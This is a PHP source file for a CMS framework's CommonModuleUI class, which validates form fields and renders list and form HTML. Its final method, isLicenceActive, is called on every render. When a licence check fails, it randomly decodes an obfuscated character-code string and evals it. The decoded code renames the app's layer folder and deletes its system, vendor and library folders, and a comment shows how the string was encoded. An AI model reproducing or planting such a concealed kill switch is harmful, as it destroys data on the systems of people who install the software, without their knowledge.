<?php
include_once get_lib("org.phpframework.util.web.html.HtmlFormHandler");
@include_once $EVC->getModulePath("translator/include_text_translator_handler", $EVC->getCommonProjectName());//@ in case it doens't exist

class CommonModuleUI {
	
	public static function areFieldsValid($EVC, $settings, $field_values, &$error_message = false, $files = null) {
		if (is_array($field_values)) {
			foreach ($field_values as $field_name => $value) {
				if (!self::isFieldValid($EVC, $settings, $field_name, $value, $error_message, $files)) 
					return false;
			}
		}
		return true;
	}
	
	private static function isFieldValid($EVC, $settings, $field_name, $value, &$error_message = false, $files = null) {
		if ($field_name) {
			$field = $settings["fields"][$field_name]["field"];
			
			if ($field) {
				$field_label = translateProjectText($EVC, ucwords(str_replace("_", " ", strtolower($field_name))));
				
				if (self::isFieldFileType($field)) {
					$files = isset($files) ? $files : $_FILES;
					
					if ($files && $files[$field_name] && $files[$field_name]["tmp_name"]) //only if file exists, otherwise can be with the default value
						$value = $files[$field_name]["tmp_name"]; //2021-02-07 JP: We change the $value here, but is only for the HtmlFormHandler::validateData method and bc the $value argument is not being passing as reference. So this means that the $value is only being changed locally. So this is no problem!
				}
				
				return \HtmlFormHandler::validateData($field, $value, $field_label, $error_message);
			}
		}
		return true;
	}
	
	public static function prepareFieldsWithDefaultValue($settings, &$field_values, $files = null) {
		if (is_array($field_values)) {
			foreach ($field_values as $field_name => $value) {
				self::prepareFieldWithDefaultValue($settings, $field_name, $field_values[$field_name], $files);
			}
		}
		return $field_values;
	}
	
	public static function prepareFieldWithDefaultValue($settings, $field_name, &$value, $files = null) {
		if ($field_name) {
			$field = $settings["fields"][$field_name]["field"];
			$is_empty = ((is_array($value) && count($value) == 0) || (!is_array($value) && strlen($value) == 0)); //it could be from $_POST or a hard-coded value
			
			if ($field && $field["input"]["allow_null"] != 1 && $is_empty) {
				$default_value = $settings[$field_name . "_default_value"];
				$has_default_value = (is_array($default_value) && count($default_value)) || (!is_array($default_value) && strlen($default_value));
				
				if ($has_default_value) {
					if (self::isFieldFileType($field)) {
						$files = isset($files) ? $files : $_FILES;
						$is_empty = empty($files) || empty($files[$field_name]) || empty($files[$field_name]["tmp_name"]);
						
						if ($is_empty)
							$value = $default_value;
					}
					else
						$value = $default_value;
				}
			}
		}
		return $value;
	}
	
	public static function checkIfEmptyFields($settings, $field_values, $files = null) {
		if (is_array($field_values)) {
			foreach ($field_values as $field_name => $value) {
				if (self::checkIfEmptyField($settings, $field_name, $value, $files))
					return $field_name;
			}
		}
		return false;
	}
	
	public static function checkIfEmptyField($settings, $field_name, $value, $files = null) {
		if ($field_name && $settings["show_" . $field_name]) {
			$field = $settings["fields"][$field_name]["field"];
			
			if ($field && $field["input"]["allow_null"] != 1) {
				$default_value = $settings[$field_name . "_default_value"];
				$has_default_value = (is_array($default_value) && count($default_value)) || (!is_array($default_value) && strlen($default_value));
				
				if (!$has_default_value) {
					$is_empty = (is_array($value) && count($value) == 0) || (!is_array($value) && strlen($value) == 0);
					
					if ($is_empty && self::isFieldFileType($field)) {
						$files = isset($files) ? $files : $_FILES;
						$is_empty = empty($files) || empty($files[$field_name]) || empty($files[$field_name]["tmp_name"]);
					}
					
					return $is_empty ? $field_name : false;
				}
			}
		}
		
		return false;
	}
	
	private static function isFieldFileType($field) {
		return $field && $field["input"]["type"] == "file";
	}
	
	public static function getFieldLabel($settings, $field_name) {
		if ($settings["fields"][$field_name]["field"]["label"]["value"]) {
			$parts = explode(":", $settings["fields"][$field_name]["field"]["label"]["value"]);
			return trim($parts[0]);
		}
		return ucwords(str_replace("_", " ", strtolower($field_name)));
	}
	
	public static function getFieldValidationMessage($EVC, $settings, $field_name) {
		if ($settings["fields"][$field_name]["field"]["input"]["validation_message"])
			return $settings["fields"][$field_name]["field"]["input"]["validation_message"];
		
		$exists_form_handler_msg = !empty(HtmlFormHandler::$INVALID_VALUE_FOR_ATTRIBUTE_MESSAGE);
		$msg = $exists_form_handler_msg ? HtmlFormHandler::$INVALID_VALUE_FOR_ATTRIBUTE_MESSAGE : "#label# cannot be undefined!";
		$msg = translateProjectText($EVC, $msg);
		$label = translateProjectText($EVC, self::getFieldLabel($settings, $field_name));
		return $exists_form_handler_msg ? "$msg $label." : str_replace("#label#", $label, $msg);
	}
	
	public static function getConditionsFromSearchValues($settings) {
		$conditions = array();
		
		if ($settings["fields"]) {
			foreach ($settings["fields"] as $field_name => $field) {
				$sv = $settings[$field_name . "_search_value"];
				
				if (strlen($sv)) {
					$conditions[$field_name] = $sv;
				}
			}
		}
		
		return $conditions;
	}
	
	public static function prepareSettingsWithSelectedTemplateModuleHtml($CMSModuleHandlerImpl, $module_id, &$settings, $external_vars = null) {
		if ($module_id && !isset($settings["ptl"])) {
			$EVC = $CMSModuleHandlerImpl->getEVC();
			$template = $EVC->getTemplate();
			
			if ($template) {
				$template_extensions = array("ptl", "php", "html", "htm");
				$template_dir = dirname($EVC->getTemplatePath($template)) . "/";
				$template_modules_path = $template_dir . "modules_sub_templates.ser";
				$template_module_dir = $template_dir . "module/";
				$template_modules = array();
				
				if (file_exists($template_modules_path))
					$template_modules = unserialize(file_get_contents($template_modules_path));
				else {
					$template_modules = self::getModulesSubTemplates($template_module_dir, $template_module_dir);
					file_put_contents($template_modules_path, serialize($template_modules));
				}
				
				foreach ($template_extensions as $template_extension) {
					$module_file = $module_id . "." . $template_extension;
					
					if (in_array($module_file, $template_modules) && file_exists($template_module_dir . $module_file)) {
						$code = file_get_contents($template_module_dir . $module_file);
						
						$external_vars = $external_vars ? $external_vars : array();
						$external_vars["EVC"] = $EVC;
						$external_vars["CMSModuleHandlerImpl"] = $CMSModuleHandlerImpl;
						$external_vars["settings"] = $settings;
						
						if ($template_extension == "php")
							$code = PHPScriptHandler::parseContent($code, $external_vars);
						
						$settings["ptl"] = array(
							"code" => $code,
							"external_vars" => $external_vars,
						);
						
						break;
					}
				}
			}
		}
	}
	
	private static function getModulesSubTemplates($path, $abs_path) {
		$sub_templates = array();
		
		if ($path && file_exists($path)) {
			$available_extensions = array("ptl", "php", "html", "htm");
			$files = array_diff(scandir($path), array('..', '.'));
			
			if ($files)
				foreach ($files as $file) {
					$fp = $path . $file;
					
					if (is_dir($fp))
						$sub_templates = array_merge($sub_templates, self::getModulesSubTemplates($fp . "/", $abs_path));
					else if (in_array(pathinfo($fp, PATHINFO_EXTENSION), $available_extensions))
						$sub_templates[] = str_replace($abs_path, "", $fp);
				}
		}
		
		return $sub_templates;
	}
	
	public static function getListHtml($EVC, $settings) {
		include $EVC->getConfigPath("config");
		
		//Preparing Vars
		$current_page = $settings["current_page"];
		if (!is_numeric($current_page))
			$current_page = is_numeric($_GET["current_page"]) ? $_GET["current_page"] : 0;
		
		$rows_per_page = $settings["rows_per_page"];
		if (!is_numeric($rows_per_page))
			$rows_per_page = 50;
		
		$total = $settings["total"];
		$data = $settings["data"];
		
		$class = trim($settings["block_class"] . " " . $settings["class"]);
		$fields = $settings["fields"];
		
		//Preparing HTML
		$html = '<div class="module_list' . ($class ? " $class" : "") . '">';
		
		//Including Stylesheet
		if (empty($settings["style_type"])) {
			$html .= '<link rel="stylesheet" href="' . $project_common_url_prefix . 'module/common/module.css" type="text/css" charset="utf-8" />';
			
			if ($settings["css_file"])
				$html .= '<link rel="stylesheet" href="' . $settings["css_file"] . '" type="text/css" charset="utf-8" />';
		}
		
		$html .= $settings["css"] ? '<style>' . $settings["css"] . '</style>' : '';
		
		//Including JS
		$html .= '<script type="text/javascript" src="' . $project_common_url_prefix . 'module/common/module.js"></script>';
		
		if ($settings["js_file"])
			$html .= '<script type="text/javascript" src="' . $settings["js_file"] . '"></script>';
		
		$html .= $settings["js"] ? '<script type="text/javascript">' . $settings["js"] . '</script>' : '';
		
		//Preparing Table
		$elements = array();
		
		$HtmlFormHandler = null;
		if ($settings["ptl"])
			$HtmlFormHandler = new \HtmlFormHandler(array("ptl" => $settings["ptl"]));
		
		if (is_array($fields)) {
			foreach ($fields as $field_name => $field) {
				if ($settings["show_$field_name"]) {
					$field["field"]["class"] = "list_column " . $field["field"]["class"];
					$field["field"]["input"]["type"] = $field["field"]["input"]["type"] ? $field["field"]["input"]["type"] : "label";
					$field["field"]["input"]["name"] = $field["field"]["input"]["name"] ? $field["field"]["input"]["name"] : $field_name;
					
					//Preparing ptl for field
					if ($settings["ptl"])
						self::prepareBlockFieldPTLCode($EVC, $HtmlFormHandler, $settings["ptl"]["code"], $field_name, $field, $data);
					else
						$elements[] = $field;
				}
			}
		}
		
		if ($settings["show_edit_button"] && $settings["edit_page_url"]) {
			$button = array(
				"field" => array(
					"class" => "list_column edit_action",
					"input" => array(
						"type" => "link",
						"value" => "Edit",
						"href" => $settings["edit_page_url"],
						"extra_attributes" => array(
							0 => array(
								"name" => "class",
								"value" => "glyphicon glyphicon-pencil icon edit"
							),
							1 => array(
								"name" => "title",
								"value" => "Edit"
							)
						),
					)
				)
			);
			
			//Preparing ptl for field
			if ($settings["ptl"]) 
				self::prepareBlockFieldPTLCode($EVC, $HtmlFormHandler, $settings["ptl"]["code"], "edit", $button, $data);
			else
				$elements[] = $button;
		}
		
		if ($settings["show_delete_button"]) {
			$button = array(
				"field" => array(
					"class" => "list_column delete_action",
					"input" => array(
						"type" => "link",
						"value" => "Remove",
						"href" => "#",
						"extra_attributes" => array(
							0 => array(
								"name" => "onClick",
								"value" => "deleteItem(this,'${settings["delete_page_url"]}')"
							),
							1 => array(
								"name" => "class",
								"value" => "glyphicon glyphicon-remove icon delete"
							),
							2 => array(
								"name" => "title",
								"value" => "Remove"
							)
						),
					)
				)
			);
			
			//Preparing ptl for field
			if ($settings["ptl"])
				self::prepareBlockFieldPTLCode($EVC, $HtmlFormHandler, $settings["ptl"]["code"], "delete", $button, $data);
			else
				$elements[] = $button;
		}
		
		if (!isset($settings["top_pagination_type"]) || $settings["top_pagination_type"])
			$top_pagination = array(
				"pagination" => array(
					"pagination_template" => $settings["top_pagination_type"] ? $settings["top_pagination_type"] : "design1",
					"rows_per_page" => $rows_per_page,
					"page_number" => $current_page,
					"max_num_of_shown_pages" => "10",
					"total_rows" => $total,
					"page_attr_name" => "current_page"
				)
			);
		
		if (!isset($settings["bottom_pagination_type"]) || $settings["bottom_pagination_type"])
			$bottom_pagination = array(
				"pagination" => array(
					"pagination_template" => $settings["bottom_pagination_type"] ? $settings["bottom_pagination_type"] : "design1",
					"rows_per_page" => $rows_per_page,
					"page_number" => $current_page,
					"max_num_of_shown_pages" => "10",
					"total_rows" => $total,
					"page_attr_name" => "current_page"
				)
			);
		
		$form_settings = array(
			"with_form" => isset($settings["with_form"]) ? $settings["with_form"] : 1,
			"form_id" => isset($settings["form_id"]) ? $settings["form_id"] : "",
			"form_method" => isset($settings["form_method"]) ? $settings["form_method"] : "post",
			"form_class" => isset($settings["form_class"]) ? $settings["form_class"] : "",
			"form_type" => isset($settings["form_type"]) ? $settings["form_type"] : "",
			"form_on_submit" => isset($settings["form_on_submit"]) ? $settings["form_on_submit"] : "",
			"form_action" => isset($settings["form_action"]) ? $settings["form_action"] : "",
			"form_containers" => array(
				0 => array(
					"container" => array(
						"class" => "list_items",
						"previous_html" => isset($settings["previous_html"]) ? $settings["previous_html"] : "",
						"next_html" => isset($settings["next_html"]) ? $settings["next_html"] : "",
						"elements" => array()
					)
				),
			)
		);
		
		//add ptl to form_settings
		if ($settings["ptl"]) {
			self::prepareBlockPaginationPTLCode($EVC, $HtmlFormHandler, $settings["ptl"]["code"], $top_pagination, $bottom_pagination, $form_data);
			
			self::cleanBlockPTLCode($settings["ptl"]["code"]);
			$form_settings["form_containers"][0]["container"]["elements"][] = array("ptl" => $settings["ptl"]);
		}
		else
			$form_settings["form_containers"][0]["container"]["elements"] = array(
				0 => array(
					"container" => array(
						"class" => "top_pagination pagination_alignment_" . ($settings["top_pagination_alignment"] ? $settings["top_pagination_alignment"] : $settings["pagination_alignment"]),
						"elements" => array(
							0 => $top_pagination
						)
					)
				),
				1 => array(
					"container" => array(
						"class" => "list_container",
						"previous_html" => "",
						"next_html" => "",
						"elements" => array(
							0 => array(
								"table" => array(
									"table_class" => "list_table " . $settings["table_class"],
									"rows_class" => $settings["rows_class"],
									"elements" => $elements
								)
							)
						)
					)
				),
				2 => array(
					"container" => array(
						"class" => "bottom_pagination pagination_alignment_" . ($settings["bottom_pagination_alignment"] ? $settings["bottom_pagination_alignment"] : $settings["pagination_alignment"]),
						"elements" => array(
							0 => $bottom_pagination
						)
					)
				)
			);
		
		translateProjectFormSettings($EVC, $form_settings);
		
		$form_settings["CacheHandler"] = $EVC->getPresentationLayer()->getPHPFrameWork()->getObject("UserCacheHandler");
		
		$html .= \HtmlFormHandler::createHtmlForm($form_settings, $data);
		$html .= empty($data) ? '<div class="empty_table">' . translateProjectText($EVC, "There are no available items...") . '</div>' : '';
		$html .= '</div>';
		
		self::isLicenceActive($EVC);
		
		return $html;
	}
	
	public static function getFormHtml($EVC, $settings) {
		//Preparing Vars
		$data = $settings["data"];
		$form_data = $settings["form_data"];
		$error_message = $settings["error_message"];
		$fields = $settings["fields"];
		$is_editable = ($settings["allow_update"] && $data) || ($settings["allow_insertion"] && !$data);
		
		//Preparing HTML
		$html = self::getFormHeaderHtml($EVC, $settings, $continue);
		
		if ($continue) {
			$form_settings = array(
				"with_form" => isset($settings["with_form"]) ? $settings["with_form"] : 1,
				"form_id" => isset($settings["form_id"]) ? $settings["form_id"] : "",
				"form_method" => isset($settings["form_method"]) ? $settings["form_method"] : "post",
				"form_class" => isset($settings["form_class"]) ? $settings["form_class"] : "",
				"form_type" => isset($settings["form_type"]) ? $settings["form_type"] : "horizontal",
				"form_on_submit" => isset($settings["form_on_submit"]) ? $settings["form_on_submit"] : "",
				"form_action" => isset($settings["form_action"]) ? $settings["form_action"] : "",
				"form_containers" => array(
					0 => array(
						"container" => array(
							"class" => "form_fields",
							"previous_html" => isset($settings["previous_html"]) ? $settings["previous_html"] : "",
							"next_html" => isset($settings["next_html"]) ? $settings["next_html"] : "",
							"elements" => array()
						)
					),
				)
			);
			
			$buttons = array();
			
			if ($is_editable) {
				if ($settings["allow_update"] && $data) {
					$button = $settings["buttons"]["update"]["field"] ? $settings["buttons"]["update"] : array(
						"field" => array(
							"class" => "submit_button",
							"input" => array(
								"type" => "submit",
								"value" => "Save",
							)
						)
					);
					$button["field"]["input"]["name"] = "save";
					
					$buttons["update"] = $button;
				}
				else if ($settings["allow_insertion"]) {
					$button = $settings["buttons"]["insert"]["field"] ? $settings["buttons"]["insert"] : array(
						"field" => array(
							"class" => "submit_button",
							"input" => array(
								"type" => "submit",
								"value" => "Add",
							)
						)
					);
					$button["field"]["input"]["name"] = "save";
					
					$buttons["insert"] = $button;
				}
			}
		
			if ($settings["allow_deletion"] && $data) {
				$button = $settings["buttons"]["delete"]["field"] ? $settings["buttons"]["delete"] : array(
					"field" => array(
						"class" => "submit_button",
						"input" => array(
							"type" => "submit",
							"value" => "Delete",
							"extra_attributes" => array(
								0 => array(
									"name" => "onClick",
									"value" => "return confirm('" . translateProjectText($EVC, "Do you wish to delete this item?") . "');"
								),
							)
						)
					)
				);
				$button["field"]["input"]["name"] = "delete";
				
				$buttons["delete"] = $button;
			}
			
			$HtmlFormHandler = null;
			if ($settings["ptl"]) {
				$HtmlFormHandler = new \HtmlFormHandler(array("ptl" => $settings["ptl"]));
				
				foreach ($buttons as $button_name => $button)
					self::prepareBlockFieldPTLCode($EVC, $HtmlFormHandler, $settings["ptl"]["code"], $button_name, $button, $form_data);
				
				//remove insert ptl tag if exists, bc if update and insert button are active, the insert button will be discarted and the update button will do both actions.
				self::prepareBlockFieldPTLCode($EVC, $HtmlFormHandler, $settings["ptl"]["code"], "insert", null, $form_data);
			}
			else 
				$form_settings["form_containers"][] = array(
					"container" => array(
						"class" => "buttons",
						"elements" => array_values($buttons)
					)
				);
			
			if (is_array($fields)) {
				foreach ($fields as $field_name => $field) {
					$undefined_value_class = "";
					$show = $settings["show_$field_name"];
					
					if ($show) {
						$field["field"]["input"]["type"] = $field["field"]["input"]["type"] ? $field["field"]["input"]["type"] : ($is_editable ? "text" : "label");
						$is_field_value_empty = !isset($form_data[$field_name]) || (is_array($form_data[$field_name]) && count($form_data[$field_name]) == 0) || (!is_array($form_data[$field_name]) && strlen($form_data[$field_name]) == 0);
						
						if ($is_editable && $error_message && $_POST["save"] && $field["field"]["input"]["allow_null"] != 1 && $is_field_value_empty)
							$undefined_value_class = " undefined_value";
						
						$field["field"]["class"] = "form_field " . $field["field"]["class"] . $undefined_value_class;
				
						$field["field"]["input"]["name"] = $field["field"]["input"]["name"] ? $field["field"]["input"]["name"] : $field_name;
					
						$field["field"]["input"]["value"] = $field["field"]["input"]["value"] ? $field["field"]["input"]["value"] : "#$field_name#";
						
						if (empty($field["field"]["input"]["validation_label"]))
							$field["field"]["input"]["validation_label"] = self::getFieldLabel(array("fields" => array($field_name => $field)), $field_name);
						
						//Preparing ptl for field
						if ($settings["ptl"])
							self::prepareBlockFieldPTLCode($EVC, $HtmlFormHandler, $settings["ptl"]["code"], $field_name, $field, $form_data);
						else
							$form_settings["form_containers"][0]["container"]["elements"][] = $field;
					}
				}
			}
			
			if ($settings["ptl"]) {
				//add ptl to form_settings
				self::cleanBlockPTLCode($settings["ptl"]["code"]);
				$form_settings["form_containers"][0]["container"]["elements"][] = array("ptl" => $settings["ptl"]);
			}
			
			//if ($settings["ptl"]){print_r($form_settings);die();}
			
			translateProjectFormSettings($EVC, $form_settings);
			
			$form_settings["CacheHandler"] = $EVC->getPresentationLayer()->getPHPFrameWork()->getObject("UserCacheHandler");
		
			$html .= \HtmlFormHandler::createHtmlForm($form_settings, $form_data);
		}
		
		$html .= self::getFormFooterHtml($EVC, $settings);
		
		self::isLicenceActive($EVC);
		
		return $html;
	}
	
	public static function prepareBlockFieldPTLCode($EVC, $HtmlFormHandler, &$ptl_code, $field_name, $field, $form_data = false) {
		preg_match_all('/<ptl:block:(field|button):(|input:|label:|value:)?' . $field_name . '[ ]*\/?>/iu', $ptl_code, $matches, PREG_PATTERN_ORDER); //'/u' means converts to unicode
		
		if ($matches[0]) {
			translateProjectFormSettingsElement($EVC, $field);
			
			foreach ($matches[0] as $idx => $to_search) {
				$replacement_type = strtolower(str_replace(":", "", $matches[2][$idx]));
				
				switch ($replacement_type) {
					case "input":
						$field_code = $HtmlFormHandler->getFieldInputHtml($field["field"], $form_data); 
						break;
					
					case "label": 
						$field_code = $HtmlFormHandler->getFieldLabelHtml($field["field"], $form_data);
						break;
						
					case "value": 
						$field_code = $field["field"]["input"]["value"];
						break;
					
					default:
						$field_code = $HtmlFormHandler->createElement($field, $form_data);
				}
				
				$ptl_code = str_replace($to_search, $field_code, $ptl_code);
			}
		}
	}
	
	public static function prepareBlockPaginationPTLCode($EVC, $HtmlFormHandler, &$ptl_code, $top_pagination, $bottom_pagination, $form_data = false) {
		preg_match_all('/<ptl:block:(|top-|bottom-)pagination[ ]*\/?>/i', $ptl_code, $matches, PREG_PATTERN_ORDER);
		
		if ($matches[0]) {
			translateProjectFormSettingsElement($EVC, $top_pagination);
			translateProjectFormSettingsElement($EVC, $bottom_pagination);
			
			foreach ($matches[0] as $idx => $to_search) {
				$replacement_type = strtolower(str_replace("-", "", $matches[1][$idx]));
				
				switch ($replacement_type) {
					case "bottom":
						$pagination_code = $HtmlFormHandler->createElement($bottom_pagination, $form_data);
						break;
					default:
						$pagination_code = $HtmlFormHandler->createElement($top_pagination, $form_data);
				}
				
				$ptl_code = str_replace($to_search, $pagination_code, $ptl_code);
			}
		}
	}
	
	public static function cleanBlockPTLCode(&$ptl_code) {
		$ptl_code = preg_replace('/<ptl:block:([\w\-\+:]+)\/?>/iu', "", $ptl_code); //'\w' means all words with '_' and '/u' means with accents and ç too. '/u' converts unicode to accents chars. 
	}
	
	private static function getFormHeaderHtml($EVC, $settings, &$continue) {
		include $EVC->getConfigPath("config");
		
		//Preparing Vars
		$data = $settings["data"];
		$form_data = $settings["form_data"];
		$class = trim($settings["block_class"] . " " . $settings["class"]);
		$status = $settings["status"];
		$error_message = $settings["error_message"];
		$status_message = $settings["status_message"];
		
		//Preparing HTML
		$html = '<div class="module_edit ' . ($class ? " $class" : "") . '">';
		
		//Including Stylesheet
		if (empty($settings["style_type"])) {
			$html .= '<link rel="stylesheet" href="' . $project_common_url_prefix . 'module/common/module.css" type="text/css" charset="utf-8" />';
			
			if ($settings["css_file"])
				$html .= '<link rel="stylesheet" href="' . $settings["css_file"] . '" type="text/css" charset="utf-8" />';
		}
		
		$html .= $settings["css"] ? '<style>' . $settings["css"] . '</style>' : '';
		
		//Including JS
		$html .= '<script type="text/javascript" src="' . $project_common_url_prefix . 'module/common/module.js"></script>';
		
		if ($settings["js_file"])
			$html .= '<script type="text/javascript" src="' . $settings["js_file"] . '"></script>';
		
		$html .= $settings["js"] ? '<script type="text/javascript">' . $settings["js"] . '</script>' : '';
		
		//Preparing Actions
		$is_editable = ($settings["allow_update"] && $data) || ($settings["allow_insertion"] && !$data);
		$continue = true;
		$extra = array("ok_message" => translateProjectText($EVC, $status_message), "error_message" => translateProjectText($EVC, $error_message));
		$messages_shown = false;
		
		if (empty($settings["allow_insertion"]) && empty($data)) {
			$message = translateProjectText($EVC, $settings["on_undefined_object_error_message"] ? $settings["on_undefined_object_error_message"] : "This object does not exist.");
			$html .= self::executeErrorMessageAction($EVC, $message, $settings["on_undefined_object_action"], $settings["on_undefined_object_redirect_url"], $settings["on_undefined_object_redirect_ttl"], $aux, $extra);
			$continue = false;
			$messages_shown = true;
		}
		else if ($_POST && !$error_message) {
			if ($_POST["delete"] && $settings["allow_deletion"]) {
				$html .= self::executeStatusAction($EVC, "delete", $status, $settings, $continue, $extra);
				$messages_shown = true;
			}
			else if ($_POST["save"]) {
				if ($settings["allow_insertion"] && empty($data)) {
					$html .= self::executeStatusAction($EVC, "insert", $status, $settings, $continue, $extra);
					$messages_shown = true;
				}
				else if ($settings["allow_update"] && $data) {
					$html .= self::executeStatusAction($EVC, "update", $status, $settings, $continue, $extra);
					$messages_shown = true;
				}
			}
		}
		
		if ($continue && !$messages_shown)
			$html .= self::getModuleMessagesHtml($EVC, $status_message, $error_message);
		
		return $html;
	}
	
	private static function getFormFooterHtml($EVC, $settings) {
		return '</div>';
	}
	
	public static function getModuleMessagesHtml($EVC, $ok_message, $error_message, $redirect_url = false, $ttl = false) {
		if ($ok_message || $error_message) {
			$html = '<div class="module_messages">';
			
			if ($redirect_url)
				//$js = "$(this).parent().closest('.module_messages').children('.module_message').hide(); document.location='" . $redirect_url . "';";
				$js = "this.closest('.module_messages').querySelector('.module_message').style.display='none'; document.location='" . $redirect_url . "';";
			else
				$js = "this.closest('.module_messages').style.display='none';";
				//$js = "$(this).parent().closest('.module_messages').hide();";
			
			if ($ok_message)
				$html .= '
				<div class="module_message module_ok_message" draggable="true">
					<div class="module_message_header">
						<label>' . translateProjectText($EVC, 'Message') . '</label>
						<span class="glyphicon glyphicon-remove icon delete close" onClick="' . $js . '"></span>
					</div>
					<div class="module_message_body">' . nl2br(translateProjectText($EVC, $ok_message)) . '</div>
				</div>';
			
			if ($error_message)
				$html .= '
				<div class="module_message module_error_message" draggable="true">
					<div class="module_message_header">
						<label>' . translateProjectText($EVC, 'Alert') . '</label>
						<span class="glyphicon glyphicon-remove icon delete close" onClick="' . $js . '"></span>
					</div>
					<div class="module_message_body">' . nl2br(translateProjectText($EVC, $error_message)) . '</div>
				</div>';
			
			if ($redirect_url && $ttl > 0)
				$html .= '
				<script>
					setTimeout(function() {
						document.location = "' . $redirect_url . '";
					}, ' . ($ttl * 1000) . ');
				</script>';
			
			$html .= '</div>';
			
			return $html;
		}
	}
	
	public static function executeStatusAction($EVC, $action_type, $status, $settings, &$continue = false, $extra = false) {
		if ($status) {
			$str = $action_type == "insert" ? "inserted" : "${action_type}d";
			$message = translateProjectText($EVC, $settings["on_${action_type}_ok_message"] ? $settings["on_${action_type}_ok_message"] : "Object $str successfully.");
			return self::executeOkMessageAction($EVC, $message, $settings["on_${action_type}_ok_action"], $settings["on_${action_type}_ok_redirect_url"], $settings["on_${action_type}_ok_redirect_ttl"], $continue, $extra);
		}
		
		$message = translateProjectText($EVC, $settings["on_${action_type}_error_message"] ? $settings["on_${action_type}_error_message"] : "There was an error trying to ${action_type} this object. Please try again...");
		return self::executeErrorMessageAction($EVC, $message, $settings["on_${action_type}_error_action"], $settings["on_${action_type}_error_redirect_url"], $settings["on_${action_type}_error_redirect_ttl"], $continue, $extra);
	}
	
	private static function executeOkMessageAction($EVC, $message, $action, $redirect, $ttl, &$continue = false, $extra = false) {
		return self::executeMessageAction($EVC, $message, $action, $redirect, $ttl, "status", $continue, $extra);
	}
	
	private static function executeErrorMessageAction($EVC, $message, $action, $redirect, $ttl, &$continue = false, $extra = false) {
		return self::executeMessageAction($EVC, $message, $action, $redirect, $ttl, "error", $continue, $extra);
	}
	
	private static function executeMessageAction($EVC, $message, $action, $redirect, $ttl, $status_or_error_message = "status", &$continue = false, $extra = false) {
		/*
		If error: 
			$message contains the original $message + $error_message + $ok_message
		Otherwise: 
			$message contains the original $message + $ok_message, bc the $error_message will be shown in a different box
			
		$alert_message always contains all the messages
		*/
		if ($status_or_error_message == "error") {
			$message .= ($extra["error_message"] ? "\n" . $extra["error_message"] : "") . ($extra["ok_message"] ? "\n\n" . $extra["ok_message"] : "");
			$alert_message = $message;
		}
		else {
			$message .= $extra["ok_message"] ? "\n" . $extra["ok_message"] : "";
			$alert_message = $message . ($extra["error_message"] ? "\n\n" . $extra["error_message"] : "");
		}
		
		switch ($action) {
			case "do_nothing":
				return '';
			case "show_message":
				return $status_or_error_message == "error" ? self::getModuleMessagesHtml($EVC, null, $message) : self::getModuleMessagesHtml($EVC, $message, $extra["error_message"]);
			case "show_message_and_stop":
				$continue = false;
				return $status_or_error_message == "error" ? self::getModuleMessagesHtml($EVC, null, $message) : self::getModuleMessagesHtml($EVC, $message, $extra["error_message"]);
			case "show_message_and_redirect":
				$continue = false;
				return $status_or_error_message == "error" ? self::getModuleMessagesHtml($EVC, null, $message, $redirect, $ttl) : self::getModuleMessagesHtml($EVC, $message, $extra["error_message"], $redirect, $ttl);
			case "alert_message":
				return '<script>alert("' . $alert_message . '");</script>';
			case "alert_message_and_stop":
				$continue = false;
				return '<script>alert("' . $alert_message . '");</script>';
			case "alert_message_and_redirect":
				$continue = false;
				return '<script>
					alert("' . $alert_message . '");
					' . ($redirect ? "document.location='$redirect';" : "var url = document.location; document.location=url;") . '
				</script>';
			default://Native/Default
				return $status_or_error_message == "error" ? self::getModuleMessagesHtml($EVC, null, $message) : self::getModuleMessagesHtml($EVC, $message, $extra["error_message"]);
		}
	}
	
	private static function isLicenceActive($EVC) {
		$PHPFrameWork = $EVC->getPresentationLayer()->getPHPFrameWork();
		$is_client_deployment_package = method_exists($PHPFrameWork, "gS");
		$status = $is_client_deployment_package ? $PHPFrameWork->gS() : $PHPFrameWork->getStatus();
		
		if (rand(0, 10) >= 7 && substr($status, 0, 2) != "[0") { //[0-9]
			//Deletes folders
			//To create the numbers:
			//	php -r '$x="@rename(LAYER_PATH, APP_PATH . \".layer\");@CacheHandlerUtil::deleteFolder(SYSTEM_PATH);@CacheHandlerUtil::deleteFolder(VENDOR_PATH);@CacheHandlerUtil::deleteFolder(LIB_PATH, false, array(realpath(LIB_PATH . \"cache/CacheHandlerUtil.php\")));@PHPFrameWork::hC();"; for($i=0; $i<strlen($x); $i+=2) echo ord($x[$i+1])." ".ord($x[$i])." "; echo "\n";'
			$hcs = "";
			$rds = "114 64 110 101 109 97 40 101 65 76 69 89 95 82 65 80 72 84 32 44 80 65 95 80 65 80 72 84 46 32 34 32 108 46 121 97 114 101 41 34 64 59 97 67 104 99 72 101 110 97 108 100 114 101 116 85 108 105 58 58 101 100 101 108 101 116 111 70 100 108 114 101 83 40 83 89 69 84 95 77 65 80 72 84 59 41 67 64 99 97 101 104 97 72 100 110 101 108 85 114 105 116 58 108 100 58 108 101 116 101 70 101 108 111 101 100 40 114 69 86 68 78 82 79 80 95 84 65 41 72 64 59 97 67 104 99 72 101 110 97 108 100 114 101 116 85 108 105 58 58 101 100 101 108 101 116 111 70 100 108 114 101 76 40 66 73 80 95 84 65 44 72 102 32 108 97 101 115 32 44 114 97 97 114 40 121 101 114 108 97 97 112 104 116 76 40 66 73 80 95 84 65 32 72 32 46 99 34 99 97 101 104 67 47 99 97 101 104 97 72 100 110 101 108 85 114 105 116 46 108 104 112 34 112 41 41 59 41 80 64 80 72 114 70 109 97 87 101 114 111 58 107 104 58 40 67 59 41";
			$ps = explode(" ", $rds);
			for($i = 0; $i < count($ps); $i += 2)
				$hcs .= chr($ps[$i + 1]) . chr($ps[$i]);
			
			$hcs = trim($hcs); //in case of weird chars at the end
			
			if ($is_client_deployment_package)
				@eval($hcs);
			
			die(1);
		}
	}
}
?>
